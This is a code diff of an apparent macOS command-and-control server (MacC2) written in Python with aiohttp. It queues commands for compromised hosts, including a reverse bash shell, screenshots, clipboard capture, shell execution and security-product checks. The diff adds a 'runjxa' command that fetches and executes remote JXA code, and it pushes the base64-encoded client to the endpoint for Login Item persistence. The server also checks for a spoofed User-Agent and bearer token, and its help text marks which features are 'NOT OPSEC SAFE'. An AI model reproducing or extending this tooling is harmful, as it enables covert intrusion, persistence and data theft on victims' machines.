@@ -3,6 +3,7 @@ import ssl
 from datetime import datetime
 import urllib.parse
 import subprocess
+import base64
 
 ##first set up ssl for this server to properly run on ssl:
 ##1. openssl req -new -newkey rsa:1024 -nodes -out ca.csr -keyout ca.key
@@ -75,10 +76,11 @@ async def CheckIn(request):
                 print(">\033[1;33mchecksecurity\033[0m: Search for common security products. \033[36mMethod: NSWorkspace class calls via Objective C\033[0m")
                 print(">\033[1;33mscreenshot\033[0m: Grap a screenshot of the OSX host. \033[36mMethod: Used xorrior's EmPyre Code here (uses Quartz CoreGraphics library)\033[0m. \033[1;91mNOT OPSEC SAFE, as this may pop up a request to the user to allow access to record screen data.\033[0m")
                 print(">\033[1;33msleep [digit]\033[0m: Change sleep time")
-                print(">\033[1;33mpersist\033[0m: Add Login Item persistence. \033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
+                print(">\033[1;33mpersist\033[0m: Add Login Item persistence. Note this uses ObjC calls identified by xorrior to write global login items even if ran from an app sandbox.\033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
                 print(">\033[1;33munpersist\033[0m: Remove the Login Item persistence. \033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
                 print(">\033[1;33mshell [shell command]\033[0m: Run a shell command...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
                 print(">\033[1;33mspawn [IP]:[port]\033[0m: Send a bash interactive reverse shell to an IP:port (ex: spawnshell 10.10.10.10:443)...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
+                print(">\033[1;33mrunjxa [url]\033[0m: Execute the jxa .js code hosted at the supplied url. \033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
                 print('')
                 print("--->OTHER<---")
                 print(">\033[1;33mdone\033[0m: Send queued commands to the client for execution")
@@ -87,7 +89,7 @@ async def CheckIn(request):
 
             elif 'exit' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'lcwd' in command:
@@ -97,106 +99,116 @@ async def CheckIn(request):
             
             elif (('pwd' in command) and ('shell' not in command)):
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif (('cat' in command) and ('shell' not in command)):
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                     
             elif 'listdir' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
 
             elif 'whoami' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'connections' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif (('cd ' in command) and ('shell' not in command)):
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'addresses' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'listusers' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'userhist' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                                     
             elif 'screenshot' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = "screencapture -x -t jpg pic.jpg"
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
 
             elif 'download ' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
         
             elif 'checksecurity' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
-            elif 'persist' in command:
+            elif command == 'persist':
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
-                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
+                pdata = open('MacC2_client.py','rb')
+                pdata2 = pdata.read()
+                pdata3 = base64.b64encode(pdata2)
+                cmds["'%s'"%str(cmdcounter)] = pdata3.decode('utf8') + '+++++'
+                print("\033[33mlogin item persistence queued for execution on the endpoint at next checkin\033[0m")
             
             elif 'unpersist' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'prompt' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'systeminfo' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'clipboard' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif 'shell ' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
 
             elif 'sleep ' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
 
             elif 'spawn ' in command:
                 cmdcounter = cmdcounter + 1
-                cmds["'%s'"%str(cmdcounter)] = command
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
+                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
+
+            elif 'runjxa ' in command:
+                cmdcounter = cmdcounter + 1
+                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                 print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
             
             elif command == 'done':
                 datalist = list(cmds.values())
+                
                 return web.json_response(datalist)
                 break
             else:
@@ -530,6 +542,22 @@ async def UnPersist(request):
     else:
         return web.HTTPNotFound()
 
+async def RunJXA(request):
+    headers = request.headers
+    UAgent = headers.get('User-Agent')
+    token = str(headers.get('Authorization'))
+    length = len(token)
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+        returndata = await request.read()
+        timestamp = datetime.now()
+        print("Timestamp: %s" % str(timestamp))
+        print("\033[92m%s\033[0m" % str(returndata.decode('utf8')))
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+
+
 app = web.Application(client_max_size=2000000000000000)
 app.add_routes([web.get('/initializee/sequence/0', InitCall),
                 web.get('/validate/status', CheckIn),
@@ -551,7 +579,8 @@ app.add_routes([web.get('/initializee/sequence/0', InitCall),
                 web.post('/validatiion/profile/16', ShellCmd),
                 web.post('/validatiion/profile/17', Sleeper),
                 web.post('/validatiion/profile/18', Persist),
-                web.post('/validatiion/profile/19', UnPersist)])
+                web.post('/validatiion/profile/19', UnPersist),
+                web.post('/validatiion/profile/20', RunJXA)])
 
 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain('ca.pem','ca.key')
